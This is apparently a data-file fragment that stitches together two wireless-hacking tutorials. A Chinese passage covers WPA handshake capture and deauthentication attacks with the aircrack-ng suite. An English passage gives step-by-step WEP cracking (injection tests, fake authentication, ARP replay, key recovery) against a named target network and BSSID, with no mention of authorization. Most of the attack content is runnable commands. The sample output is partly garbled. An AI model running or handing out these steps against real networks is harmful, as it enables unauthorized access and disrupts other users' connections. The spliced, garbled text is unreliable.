    \ 案例中已经过了。\n\n## 使用 Airodump-ng 捕获握手\n\n### 1. 查找无线适配器的名称\n好了，现在你的电脑有很多网络适配器，为了扫描其中一个，你需要知道它的名称。wlan\
    \ 接口未显示的问题：这是因为虚拟机无法使用内置无线网卡，你必须使用外置网卡。你应该尝试使用 Live USB 启动 Kali（只需看本教程的第一部分），或购买一个外置网卡。\n\
    \n### 2. 启用监听模式\n现在，使用 `airmon-ng` 工具创建一个接口：\n```\nairmon-ng start wlan0\n```\n\
    `mon0` 接口将被创建。\n\n### 3. 开始捕获数据包\n现在我们使用 `airodump-ng` 在空中捕获数据包。该工具从空中收集数据。你会看到想要破解的\
    \ WiFi。\n```\nairodump-ng mon0\n```\n\n### 4. 将捕获的数据包存储到文件中\n这可以通过给 `airodump`\
    \ 命令提供更多参数来实现：\n```\nairodump-ng mon0 --write name_of_file\n```\n\n示例：\n```bash\n\
    root@kali:~# airmon-ng start wlan1\nroot@kali:~# airodump-ng mon0 -w anyhere\n\
    ```\n\n现在从 `airodump-ng` 屏幕复制目标网络的 `bssid`，并使用 `aireplay-ng` 启动 `deauth` 攻击：\n\
    ```bash\nroot@kali:~# aireplay-ng --deauth 0 -a BSSID here mon0\n```\n`--deauth`\
    \ 告诉 `aireplay` 启动取消认证攻击。`0` 告诉它以 0 秒为间隔运行（非常快，只需运行几秒并按 `ctrl+c`）。`-a` 需要 BSSID，将\
    \ `BSSID here` 替换为你的 BSSID。`mon0` 是你创建的接口。\n\n如果在通道切换之间遇到问题，或者遇到信标帧问题，可以通过以下命令固定\
    \ `mon0` 通道：\n```bash\nroot@kali:~# airodump-ng mon0 -w anyhere -c 1\n```\n将 `1`\
    \ 替换为目标所在的通道。如果 `aireplay` 要求，你可能还需要添加 `--ignorenegative-one`。在我的情况下，`airodump-ng`\
    \ 显示 `mon0` 通道为 -1，所以这是必须的。\n\n现在当你查看 `airodump-ng` 屏幕时，你会看到右上显示 `WPA captured`。它看起来是：\n\
    ```\nCH 1 ][ Elapsed: 4 s ][ 204-06-13 2:4 ][ WPA handshake: \nBSSID         \
    \    RXQ Beacons  #Data,/s  CH  MB  CIPHER AUTH ESSID\n02:73:8D:37:A7:ED -47 \
    \    75      201     35  0   54 CCMP  PSK me\nBSSID             STATION      \
    \ PWR  Rate    Lost    Frames  Probe\n*               *              0   0e- 1\
    \     742      82\n```\n你可以通过输入以下命令进行确认：\n```bash\nroot@kali:~# aircrack-ng anyhere-01.cap\n\
    ```\n打开 `anyhere-01.cap`。\n读取了 212 个数据包。\n```\n #  BSSID             ESSID   \
    \                            Encryption\n 1 ***************me                \
    \               WPA (1 handshake)   2  **                               Unknown\n\
    ```\n"
- fmt: "\nFirst, you can buy a new external wireless adapter. Secondly, you can side\
    \ install Kali with Windows or run it via a USB. A virtual machine can only use\
    \ computer hardware if it is externally connected via USB. Now there is another\
    \ catch here. The internal adapters, almost all of them, don't support injection.\
    \ This is extremely important for speeding up wireless hacking. So if you really\
    \ want to go in depth of wireless hacking, then its time to buy an external adapter\
    \ or two (the more the better). If that's not a possibility, you might want to\
    \ spend hours trying to get a driver which might make your internal adapter support\
    \ injection (I don't know anyone who succeeded in this, but it might be possible).\n\
    \n### Check Injection Support\n\n`Acrack-ng` has a comprehensive article related\
    \ to checking injection support. You might check their website out for it. I am\
    \ just providing the commands which will be enough to find out whether injection\
    \ is working or not.\n\n```\nairmon-ng start wlan0 [or wlan1]\n```\n\n(Puts your\
    \ wireless adapter in monitor mode. From now we'll refer to `wlan0/wlan1` as `mon0`)\n\
    \n```\nairserv-ng -d mon0\naireplay-ng -9 127.0.0.1:666\n```\n\n![](Images/image00057.jpeg)\n\
    \nThis basically sets up a “temporary server” that is waiting for you to test\
    \ your injection capabilities. The second command actually tries to inject the\
    \ server, and succeeds. `127.0.0.1` is the IP which is reserved for loopback.\
    \ It is always used when you are carrying out some command on yourself. `666`\
    \ is the port we are using. Most of the time, what follows an IP and a colon is\
    \ the port. The general form is somewhat like `IP:port`. So finally you have checked\
    \ your injection capabilities, and the last line `\"Injection is working!\"` will\
    \ confirm it.\n\n### Check Signal Strength\n\nWhile the basic hacking methods\
    \ from the previous chapter don't have any real strength restriction, you need\
    \ to be physically close to the access point in order to inject packets. There\
    \ is information regarding the same in the same `aircrack-ng` tutorial. Again,\
    \ I'm gonna summarize what you have to do here.\n\nFirst, we will use `airodump-ng\
    \ mon0` to see the list of networks in range. See the one you want to hack: \n\
    \n![](Images/image00038.jpeg)`Airodump-ng` lists the networks in range.\n\nNow\
    \ we will hack the digisol network. Make a note of the `BSSID` of the network\
    \ you want to hack. A good practice is to store all the information gathered in\
    \ any text editor. We should, at this stage, take a note of following:\n\n- ESSID\
    \ - `DIGISOL`\n- BSSID - `00:17:7C:22:CB:80`\n- CH (channel) - `2`\n- Mac address\
    \ of genuine users connected to the network:\n- Interface : `wlan1` - referred\
    \ to as `mon0`\n\nYou should gather the equivalent information for the network\
    \ you will be working on. Then just change the values whenever I use them in any\
    \ of the commands.\n\nNote: We need at least one user (wired or wireless) connected\
    \ to the network and using it actively. The reason is that this tutorial depends\
    \ on receiving at least one ARP request packet and if there are no active clients\
    \ then there will never be any ARP request packets. \n\nNow, to check whether\
    \ the signal strength will be sufficient, we will simply execute the following\
    \ code:\n\n```\nairodump-ng [interface] -c [channel]\nairodump-ng mon0 -c 2\n\
    ```\n\nThis will make the wireless card only read packets in the channel no. `2`,\
    \ on which our target network is.\n\nNow to test the network, type the following\
    \ code:\n\n```\naireplay-ng --test -e DIGISOL -a 00:17:7C:22:CB:80 mon0\n```\n\
    \n![](Images/image00058.jpeg)\n\nThe last time we checked whether the wireless\
    \ card had the capability to inject packets. We tested it on our own computer.\
    \ This time, we actually injected packets into the target computer. If this worked,\
    \ then it's pretty good news, and it means that you are most probably going to\
    \ be able to hack this network. The last line `30/30 : 100%` determines how good\
    \ the strength of the signal is. A very high percentage is a good sign, and `100`\
    \ is ideal.\n\n### Capture Packets\n\nNow we have already run `airodump-ng` a\
    \ couple of times. However, this time we will pass the `-w` command which will\
    \ instruct `airodump-ng` to save the output to a file:\n\n```\nairodump-ng -c\
    \ [channel] --bssid [bssid]-w [file_name] [interface]\nairodump-ng -c 2 --bssid\
    \ 00:17:7C:22:CB:80 -w dump mon0\n```\n\nThe output will be saved in a file `dump-01.cap`.\n\
    \nNow we can keep this terminal running and it will keep saving the packets. [In\
    \ the previous tutorial we did only 2 things, capture the packet, i.e this step,\
    \ and crack it, i.e the step we are going to do last. While it makes our work\
    \ easier to just follow two steps, it also makes the process much more time consuming,\
    \ since we are simply a passive packet listener, who is not doing anything]\n\n\
    ### Speeding Things Up\n\n#### Fake Authentication\n\n![](Images/image00038.jpeg)\
    \ Now to speed things up, we will inject the network. This will fill up our `airodump-ng`\
    \ capture, and data is what will help us obtain the password. As soon as we have\
    \ `10000` data packets, we can start attempting to get the password using `aircrack-ng`.\n\
    \nNow to make the AP pay attention to your injected packets, you either have to\
    \ be a connected client or pretend to be one. We will do the latter (If you see\
    \ an error like the AP is on channel `x` and `mon0` is on channel `y` then go\
    \ to the bottom of the chapter for):\n\n```\naireplay-ng -1 0 -e DIGISOL -a 00:17:7C:22:CB:80\
    \ mon0\n```\n\n#### ARP request mode\n\nARP packets are your best bet at getting\
    \ a lot of IVs or data. Without IVs you can't hack a network. Enter the following\
    \ code to make `aireplay-ng` listen to the AP for ARP packets, and inject them\
    \ as soon as they find one. This will create a lot of data very fast. This is\
    \ the real speeding step. \n\n```\naireplay-ng -3 -b [BSSID] mon0\n```\n\nThis\
    \ is what the final code will like:\n\n```\naireplay-ng -3 -b 00:17:7C:22:CB:80\
    \ mon0\n```\n\nNow you'll have to wait for some time till it gets an ARP request.\
    \ As soon as it gets one, the terminal will sort of explode. And the data packets\
    \ will start filling in with Godspeed. Now this is the part where an active user\
    \ on the network is absolutely necessary.\n\n### Cracking the network\n\nCracking\
    \ the network is as easy as typing the following into the console\n\n```\naircrack-ng\
    \ name_of_file-01.cap\n```\n\nIn our case, the command will be:\n\n```\naircrack-ng\
    \ dump-01.cap\n```\n\n![](Images/image00059.jpeg) After pressing enter, you will\
    \ have a list of networks and you'll be prompted to select which one of them to\
    \ hack. In my case there was just one network, so I couldn't get that screen,\
    \ or a screenshot. The password was cracked in less than a second.\n\n![](Images/image00060.jpeg)So\
    \ finally you have obtained the password of the network you were trying to hack.\n\
    \n"
